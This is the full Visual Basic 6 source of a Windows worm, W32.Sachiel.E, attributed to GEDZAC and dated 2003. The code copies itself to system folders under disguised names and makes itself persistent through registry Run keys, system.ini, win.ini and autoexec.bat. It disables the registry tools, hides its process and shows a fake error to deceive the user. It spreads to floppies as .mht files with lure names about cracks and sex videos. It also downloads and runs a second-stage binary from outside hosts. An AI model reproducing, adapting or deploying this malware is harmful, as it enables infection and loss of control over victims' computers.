   VERSION 5.00
   Begin VB.Form Sachiel
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BorderStyle     =   0  'None
      Caption         =   "Sachiel"
      ClientHeight    =   435
      ClientLeft      =   0
      ClientTop       =   0
      ClientWidth     =   480
      Icon            =   "sachiel.frx":0000
      LinkTopic       =   "Form1"
      ScaleHeight     =   435
      ScaleWidth      =   480
      ShowInTaskbar   =   0   'False
      StartUpPosition =   3  'Windows Default
      Visible         =   0   'False
      Begin VB.Timer sTime
         Enabled         =   0   'False
         Interval        =   10000
         Left            =   0
         Top             =   0
      End
   End
   Attribute VB_Name = "Sachiel"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   Private Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
   Private Declare Function CreateMutex Lib "kernel32" Alias "CreateMutexA" (ByRef lpMutexAttributes As SECURITY_ATTRIBUTES, ByVal bInitialOwner As Long, ByVal lpName As String) As Long
   Private Type SECURITY_ATTRIBUTES
   nLength As Long: lpSecurityDescriptor As Long: bInheritHandle As Long
   End Type
   Private Const ERROR_ALREADY_EXISTS = 183&: Dim Mutex
   Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
   Private Declare Function GetCommandLine Lib "kernel32" Alias "GetCommandLineA" () As String
   Private Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
   Private Declare Function InternetGetConnectedState Lib "wininet.dll" (ByRef IpdwFlags As Long, ByVal dwReserved As Long) As Long
   Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long
   Private Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessId As Long, ByVal dwType As Long) As Long
   Dim Sf As Object, Sw As Object, Rnames(1 To 5) As String
   Private Sub Form_Load()
   '<----------GEDZAC LABS----------->
   'W32.Sachiel.E.worm by MachineDramon/GEDZAC
   '29/09/03 - Derechos Reservados
   'Hecho en el Perú, Calidad Mundial
   On Error Resume Next
   Set Sf = CreateObject("scripting.filesystemobject")
   Set Sw = CreateObject("wscript.shell"): Call HideProcess
   If Dir(Sdir(0) & "S.a.c.h.i.e.l.dll") <> "" Then Call NoSetup Else Call Setup
   End Sub

   Sub Setup()
   On Error Resume Next

   FileCopy Sdir(3), Sdir(0) & "help\" & "Sachie" & "l.sys.bat": SA Sdir(0) & "help\" & "Sachie" & "l.sys.bat", 6
   FileCopy Sdir(3), Sdir(1) & "help" & "dks" & ".dll": SA Sdir(1) & "help" & "dks" & ".dll", 6
   FileCopy Sdir(3), Sdir(1) & "winr" & "un." & "pif": SA Sdir(1) & "winr" & "un." & "pif", 6

   FileCopy "C:\" & Dir("C:\*.mht"), Sdir(0) & "S.a.c.h.i.e.l.dll"
   FileCopy Sdir(3), Sdir(1) & "Conmand.com": SA Sdir(1) & "Conmand.com", 6
   FileCopy Sdir(3), Sdir(1) & "MS-Win.exe": SA Sdir(1) & "MS-Win.exe", 6
   FileCopy Sdir(3), Sdir(1) & "WinShell.com": SA "WinShell.com", 6
   FileCopy Sdir(3), Sdir(1) & "Ipconfig.exe": SA "Ipconfig.exe", 6

   WIni "boot", "shell", "Explorer.exe " & Sdir(1) & "WinShell.com", Sdir(0) & "system.ini"
   WIni "Windows", "run", Sdir(1) & "Ipconfig.exe", Sdir(0) & "win.ini"

   Rw "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Policies\System\DisableRegistryTools", 1, "BWORD"
   Rw "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "PWORD"
   Rw "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WHelp", Sdir(1) & "MS-Win.exe", ""
   Rw "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Run\WHelp", Sdir(1) & "MS-Win.exe", ""

   If FileExist("C:\Autoexec.bat") Then Set Au = Sf.OpenTextFile("C:\Autoexec.bat", 8): Au.write vbCrLf & "@win " & Right(Sdir(1), Len(Sdir(1)) - 2) & "Conmand.com": Au.Close
   MsgBox "El archivo esta total o parcialmente dañado, imposible abrir el archivo", vbCritical, "Error"
   Sleep 10000
   Sw.run Sdir(1) & "MS-Win.exe"
   End

   End Sub

   Sub regenerar()
   rr1 = Array("Conmand.com", "MS-Win.exe", "WinShell.com", "Ipconfig.exe")
   For i2 = 0 To UBound(rr1)
   If Not (FileExist(Sdir(1) & rr1(i2))) Then FileCopy Sdir(3), Sdir(1) & rr1(i2)
   Next

   WIni "boot", "shell", "Explorer.exe " & Sdir(1) & "WinShell.com", Sdir(0) & "system.ini"
   WIni "Windows", "run", Sdir(1) & "Ipconfig.exe", Sdir(0) & "win.ini"

   Rw "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Policies\System\DisableRegistryTools", 1, "BWORD"
   Rw "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "PWORD"
   Rw "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WHelp", Sdir(1) & "MS-Win.exe", ""
   Rw "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Run\WHelp", Sdir(1) & "HHelp.exe", ""

   End Sub

   Sub NoSetup()
   On Error Resume Next
   If (App.PrevInstance) Or (InStr(LCase(Sdir(3)), LCase(Sdir(1))) = 0) Then
   End
   End If
   Set Wt = Sf.createtextfile(Sdir(0) & "Wininit.ini"): Wt.write "[Rename]": Wt.Close
   Call CreateSMutex: Call regenerar: Call RegNames: Call Infected
   For i3 = 1 To 5
   Rnames(i3) = Rr("HKEY_LOCAL_MACHINE\Software\GEDZAC LABS\W32.SachielE\files\" & CStr(Day(Date)) & "\f" & CStr(i3))
   Next: sTime.Enabled = True
   Kill "C:\*.mht"
   End Sub

   Sub RegNames()
   On Error Resume Next
   regname = Array("Ana Kournikova Sex Video.mht", "AVP Antivirus Pro Key Crack.mht", "Britney Spears Sex Video.mht", "Buffy Vampire Slayer Movie.mht", _
   "Crack Passwords Mail.mht", "Cristina Aguilera Sex Video.mht", "Game Cube Real Emulator.mht", "Hentai Anime Girls Movie.mht", "Jenifer Lopez Sex Video.mht", _
   "Matrix Movie.mht", "Mcafee Antivirus Scan Crack.mht", "Norton Anvirus Key Crack.mht", "Panda Antivirus Titanium Crack.mht", "PS2 PlayStation Simulator.mht", _
   "Quick Time Key Crack.mht", "Sakura Card Captor Movie.mht", "Sex Live Simulator.mht", "Sex Passwords.mht", "Spiderman Movie.mht", "Start Wars Trilogy Movies.mht", _
   "Thalia Sex Video.mht", "Winzip KeyGenerator Crack.mht ", "aol cracker.mht", "aol password cracker.mht", "divx pro.mht", "GTA 3 Crack.mht", "GTA 3 Serial.mht", _
   "play station emulator.mht", "virtua girl - adriana.mht", "virtua girl - bailey short skirt.mht", "Virtua Girl (Full).mht", "warcraft 3 crack.mht", "warcraft 3 serials.mht", _
   "counter-strike.mht", "delphi.mht", "divx_pro.mht", "HotGirls.mht", "hotmail_hack.mht", "pamela_anderson.mht", "serials2000.mht", "subseven.mht", "VB6.mht", "VirtualSex.mht", _
   "ACDSee 5.5.mht", "Age of Empires 2 crack.mht", "Animated Screen 7.0b.mht", "AOL Instant Messenger.mht", "AquaNox2 Crack.mht", "Audiograbber 2.05.mht", "BabeFest 2003 ScreenSaver 1.5.mht", _
   "Babylon 3.50b reg_crack.mht", "Battlefield1942_bloodpatch.mht", "Battlefield1942_keygen.mht", "Business Card Designer Plus 7.9.mht", "Clone CD 5.0.0.3 (crack).mht", "Clone CD 5.0.0.3.mht", _
   "Coffee Cup Free exe 7.0b.mht", "Cool Edit Pro v2.55.mht", "Diablo 2 Crack.mht", "DirectDVD 5.0.mht", "DirectX Buster (all versions).mht", "DirectX InfoTool.mht", "DivX Video Bundle 6.5.mht", _
   "Download Accelerator Plus 6.1.mht", "DVD Copy Plus v5.0.mht", "DVD Region-Free 2.3.mht", "FIFA2003 crack.mht", "Final Fantasy VII XP Patch 1.5.mht", "Flash MX crack (trial).mht", "FlashGet 1.5.mht", _
   "FreeRAM XP Pro 1.9.mht", "GetRight 5.0a.mht", "Global DiVX Player 3.0.mht", "Gothic2 licence.mht", "Guitar Chords Library 5.5.mht", "Hitman_2_no_cd_crack.mht", "Hot Babes XXX Screen Saver.mht", _
   "ICQ Pro 2003a.mht", "ICQ Pro 2003b (new beta).mht", "iMesh 3.6.mht", "iMesh 3.7b (beta).mht", "IrfanView 4.5.mht", "KaZaA Hack 2.5.0.mht", "KaZaA Speedup 3.6.mht", "Links 2003 Golf game (crack).mht", _
   "Living Waterfalls 1.3.mht", "Mafia_crack.mht", "Matrix Screensaver 1.5.mht", "MediaPlayer Update.mht", "mIRC 6.40.mht", "mp3Trim PRO 2.5.mht", "MSN Messenger 5.2.mht", "NBA2003_crack.mht", _
   "Need 4 Speed crack.mht", "Nero Burning ROM crack.mht", "Netfast 1.8.mht", "Network Cable e ADSL Speed 2.0.5.mht", "NHL 2003 crack.mht", "Nimo CodecPack (new) 8.0.mht", "PalTalk 5.01b.mht", _
   "Popup Defender 6.5.mht", "Pop-Up Stopper 3.5.mht", "QuickTime_Pro_Crack.mht", "Serials 2003 v.8.0 Full.mht", "SmartFTP 2.0.0.mht", "SmartRipper v2.7.mht", "Space Invaders 1978.mht", _
   "Splinter_Cell_Crack.mht", "Steinberg_WaveLab_5_crack.mht", "Trillian 0.85 (free).mht", "TweakAll 3.8.mht", "Unreal2_bloodpatch.mht", "Unreal2_crack.mht", "UT2003_bloodpatch.mht", _
   "UT2003_keygen.mht", "UT2003_no cd (crack).mht", "UT2003_patch.mht", "WarCraft_3_crack.mht", "Winamp 3.8.mht", "WindowBlinds 4.0.mht", "WinOnCD 4 PE_crack.mht", "WinZip 9.0b.mht", _
   "Yahoo Messenger 6.0.mht", "Zelda Classic 2.00.mht", "Windows XP complete + serial.mht", "Screen saver christina aguilera.mht", "Screen saver christina aguilera naked.mht", "Visual basic 6.mht", _
   "Starcraft serial.mht", "Credit Card Numbers generator(incl Visa,MasterCard,...).mht", "Edonkey2000-Speed me up scotty.mht", "Hotmail Hacker 2003-Xss Exploit.mht", "Kazaa SDK + Xbit speedUp for 2.xx.mht", _
   "Microsoft KeyGenerator-Allmost all microsoft stuff.mht", "Netbios Nuker 2003.mht", "Security-2003-Update.mht", "Stripping MP3 dancer+crack.mht", "Visual Basic 6.0 Msdn Plugin.mht", "Windows Xp Exploit.mht", _
   "WinRar 3.xx Password Cracker.mht", "WinZipped Visual C++ Tutorial.mht", "XNuker 2003 2.93b.mht", "cable modem ultility pack.mht", "macromedia dreamweaver key generator.mht", "winamp plugin pack.mht", _
   "winzip full version key generator.mht", "Patricia.mht", "ListFonos.mht", "Animaciones.mht", "Manual.mht", "Diario.mht", "directivas.mht", "mp3list.mht", "winfile.mht", "Compras.mht")
   x = 1
   For i4 = 0 To UBound(regname) Step 5
   Rw "HKEY_LOCAL_MACHINE\Software\GEDZAC LABS\W32.SachielE\files\" & x & "\f1", regname(i4), ""
   Rw "HKEY_LOCAL_MACHINE\Software\GEDZAC LABS\W32.SachielE\files\" & x & "\f2", regname(i4 + 1), ""
   Rw "HKEY_LOCAL_MACHINE\Software\GEDZAC LABS\W32.SachielE\files\" & x & "\f3", regname(i4 + 2), ""
   Rw "HKEY_LOCAL_MACHINE\Software\GEDZAC LABS\W32.SachielE\files\" & x & "\f4", regname(i4 + 3), ""
   Rw "HKEY_LOCAL_MACHINE\Software\GEDZAC LABS\W32.SachielE\files\" & x & "\f5", regname(i4 + 4), "": x = x + 1
   Next
   End Sub

   Function FileExist(path) As Boolean
   On Error Resume Next: FileExist = IIf(Sf.fileexists(path), True, False)
   End Function

   Function Sdir(n) As String
   On Error Resume Next
   Select Case n
   Case 0: Sdir = Sf.GetSpecialFolder(0) & "\"
   Case 1: Sdir = Sf.GetSpecialFolder(1) & "\"
   Case 2: Sdir = Sf.GetSpecialFolder(2) & "\"
   Case 3: Sdir = Mid(GetCommandLine(), 2, InStr(Mid(GetCommandLine(), 2), Chr(34)) - 1)
   End Select
   End Function

   Sub WIni(I_S As String, IK As String, IV As String, IP As String)
   On Error Resume Next: Dim Wn As Long: Wn = WritePrivateProfileString(I_S, IK, IV, IP)
   End Sub

   Sub Rw(R, k, t)
   On Error Resume Next
   If t = "" Then Sw.RegWrite R, k Else Sw.RegWrite R, k, "REG_DWORD"
   End Sub

   Function Rr(rpath)
   On Error Resume Next: Rr = Sw.RegRead(rpath)
   End Function

   Sub HideProcess()
   On Error Resume Next: Dim H As Long
   H = RegisterServiceProcess(GetCurrentProcessId(), 1)
   End Sub

   Sub CreateSMutex()
   On Error Resume Next
   Dim sMutex As SECURITY_ATTRIBUTES
   sMutex.lpSecurityDescriptor = 0: sMutex.nLength = Len(sMutex): sMutex.bInheritHandle = 1
   Mutex = CreateMutex(sMutex, 1, "Sachiel_E")
   If (Err.LastDllError = ERROR_ALREADY_EXISTS) Then
   End
   End If
   End Sub

   Private Sub Form_Terminate()
   On Error Resume Next: CloseHandle (Mutex)
   End Sub

   Private Sub Form_Unload(Cancel As Integer)
   On Error Resume Next: CloseHandle (Mutex)
   End Sub

   Private Sub sTime_Timer()
   On Error Resume Next: sTime.Enabled = False: Static ra As Integer
   If ra = 60 Then ra = 0: FdInfected Else ra = ra + 1
   If GetWinVersion() = 2 Then KantiNT Else KAnti98
   Dim Src As Boolean
   Src = EnumWindows(AddressOf FuncSearchScan, ByVal 0&)
   sTime.Enabled = True
   End Sub

   Sub FdInfected()
   On Error Resume Next: Static Espejo As String, eb1 As String

   For Each fd In Sf.Drives
   If (fd.DriveType <> 1) Or (fd.IsReady = False) Then Exit Sub
   If (fd.freespace < 70000) Then Exit Sub

   Randomize: R = Int(Rnd * 5) + 1: df1 = LCase(Dir(fd.path & "\*.*"))
   If Espejo <> "" Then eb1 = Espejo Else eb1 = "bEs-GEDZAC"
   If (df1 <> "") And (Espejo <> df1) And (InStr(df1, ".mht") = 0) And (InStr(df1, eb1) = 0) Then
   Espejo = df1: FileCopy Sdir(0) & "S.a.c.h.i.e.l.dll", fd.path & "\" & df1 & ".mht"
   Else
   If FileExist(fd.path & "\" & Rnames(R)) Then Exit Sub
   FileCopy Sdir(0) & "S.a.c.h.i.e.l.dll", fd.path & "\" & Rnames(R)
   End If
   Next
   End Sub

   Sub payload()
   On Error Resume Next
   If Day(Date) <> 14 Then Exit Sub
   MsgBox "W32.Sachiel.E by MachineDramon/GEDZAC" & vbCrLf & _
   "Worm Simple de Disckets, sin efectos destructivos" & vbCrLf & _
   "Hecho en el Perú, Calidad Mundial" & vbCrLf & "GEDZAC LABS 2003"
   End Sub

   Sub Infected()
   On Error Resume Next
   If (Month(Date) > 10) Or (Year(Date) > 2003) Then
   If (FileExist(Sdir(1) & "BBB.exe") = True) Or (BState = False) Then Exit Sub
   db = Array("http:\\dbm1.envy.nu\bupdate.bin", "http:\\gbm1.envy.nu\bupdate.bin", "http:\\jbm1.envy.nu\bupdate.bin")
   Randomize: j3 = Int(Rnd * 3)
   Bardiel = DowFile(CStr(db(j3)), Sdir(1) & "BBB.exe")
   If (Bardiel = True) And (FileLen(Sdir(1) & "BBB.exe") > 50000) Then Sw.run Sdir(1) & "BBB.exe": MsgBox "Esto Comienza Ahora, En este Instante" Else Kill Sdir(1) & "BBB.exe"
   End If
   End Sub

   Function DowFile(BURL As String, BPath As String) As Boolean
   On Error Resume Next: Dim lngRetVal As Long
   lngRetVal = URLDownloadToFile(0, BURL, BPath, 0, 0)
   DowFile = IIf(lngRetVal = 0, True, False)
   End Function

   Sub SA(P, a)
   On Error Resume Next: SetAttr P, a
   End Sub

   Function BState() As Boolean
   On Error Resume Next: BState = IIf(InternetGetConnectedState(0&, 0&) <> 0, True, False)
   If Err Then BState = True
   End Function
